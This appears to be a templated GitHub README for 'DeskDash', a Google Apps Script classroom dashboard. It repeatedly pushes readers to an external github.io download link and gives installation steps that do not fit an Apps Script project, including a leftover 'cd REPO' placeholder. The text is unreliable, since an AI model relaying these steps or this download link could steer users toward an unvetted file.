# DeskDash - Classroom Dashboard 2026

> **DeskDash is a projection-friendly classroom dashboard built with Google Apps Script, Google Sheets, React, and Vite to bring teacher tools, timers, student selection, deadlines, and classroom activity controls into one workspace.**

[![Platform](https://img.shields.io/badge/Platform-Google%20Apps%20Script-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lbaecker05/deskdash-win-20967?style=flat-square)](https://github.com/lbaecker05/deskdash-win-20967)

---

<p align="center">
  <a href="https://lbaecker05.github.io/deskdash-win-20967/">
    <img src="https://img.shields.io/badge/Download-DeskDash%20Latest-brightgreen?style=for-the-badge" alt="Download DeskDash">
  </a>
</p>

> **[Direct Download - DeskDash Current Build](https://lbaecker05.github.io/deskdash-win-20967/)**

---

[Download Latest Build](https://lbaecker05.github.io/deskdash-win-20967/)

---

## About DeskDash

DeskDash gives teachers a single, adaptable display for everyday classroom routines. Its dashboard combines date selection, deadlines, countdowns, student selection, and classroom noise monitoring in a layout designed for visibility on a projected screen.

The application connects dashboard editing with Google Sheets and provides separate teacher and display-oriented views. Drag-and-drop organization, theme controls, period filtering, and inline updates make it useful for classrooms that need quick access to changing information without switching between multiple tools.

---

## Features

- Smart date picker that moves past weekends automatically
- Drag-and-drop layout organization for dashboard components
- Inline dashboard editing with Google Sheets synchronization
- Pop-up countdown timer with synchronized windows
- Random student picker with filtering by class period
- Sortable deadlines widget with create, edit, and delete controls
- Browser microphone noise meter for classroom activity monitoring
- Dual-view setup for teacher controls and projected classroom display
- Light and dark themes with customizable accent colors

---

## Installation

### Download the current build

1. Open the [DeskDash download page](https://lbaecker05.github.io/deskdash-win-20967/).
2. Download the available build.
3. Open the project in the Google Apps Script environment.
4. Connect the dashboard to the Google Sheet used for classroom data.
5. Deploy or launch the Apps Script project according to your classroom setup.

### Work from the repository

```bash
git clone https://github.com/lbaecker05/deskdash-win-20967.git
cd REPO
```

The project uses React and Vite alongside Google Apps Script. Review the repository files for the available development and deployment workflow before running the dashboard.

---

## Usage

A typical classroom workflow looks like this:

1. Open DeskDash from its deployed Google Apps Script web app.
2. Select the date or classroom period you want to work with.
3. Arrange dashboard widgets using drag-and-drop.
4. Update classroom information directly in the dashboard or through the connected Google Sheet.
5. Use the teacher view to manage timers, deadlines, and student selection.
6. Open the display-oriented view when presenting the dashboard to students.
7. Adjust the theme and accent color to suit the display environment.
8. Enable the browser microphone meter when classroom noise feedback is needed.

### Example activities

- Start a synchronized countdown for independent work.
- Pick a student at random from a selected period.
- Sort deadlines by the information needed next.
- Display the current classroom dashboard while keeping controls in the teacher view.
- Monitor classroom sound levels through the browser noise meter.

---

## Configuration

DeskDash stores dashboard information through its Google Sheets integration. Use the connected sheet as the central place for data that should remain available across dashboard sessions.

Configuration areas include:

- Dashboard widget arrangement
- Classroom periods used by the student picker
- Deadline entries and ordering
- Theme mode and accent color
- Teacher and projected display views
- Browser microphone access for the noise meter

For first-time setup, verify that the Apps Script project can access the selected Google Sheet and that the browser has microphone permission before using the noise meter.

---

## Requirements

- Google Apps Script
- A Google Sheet for synchronized dashboard data
- A modern web browser
- React and Vite for the application interface
- Browser microphone access for the noise meter
- A screen or projector for projection-focused use
- Network access suitable for the deployed Apps Script application

---

## FAQ

### Who is DeskDash for?

DeskDash is intended for teachers and classroom environments that need a shared dashboard for routines, deadlines, timers, student selection, and classroom activity feedback.

### How are dashboard changes saved?

Dashboard editing is designed to synchronize with Google Sheets. Confirm that the project is connected to the intended sheet before entering classroom data.

### Can I use a separate teacher control view?

Yes. DeskDash includes a dual-view arrangement that separates teacher controls from the view intended for classroom projection.

### How do I use the student picker for a specific class?

Choose the relevant period filter before starting the random selection workflow.

### Why is the noise meter not responding?

Check that the browser has microphone permission and that the selected device is available to the browser. The noise meter relies on browser microphone access.

### Can I change the appearance?

Yes. DeskDash includes light and dark themes along with accent color options.

### How do I update DeskDash?

Download the latest available build from the [project download page](https://lbaecker05.github.io/deskdash-win-20967/) and follow the deployment process for the Google Apps Script project.

### Where should I report a problem?

Review the repository documentation and open an issue at [github.com/lbaecker05/deskdash-win-20967](https://github.com/lbaecker05/deskdash-win-20967) with the affected workflow, browser details, and relevant configuration information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
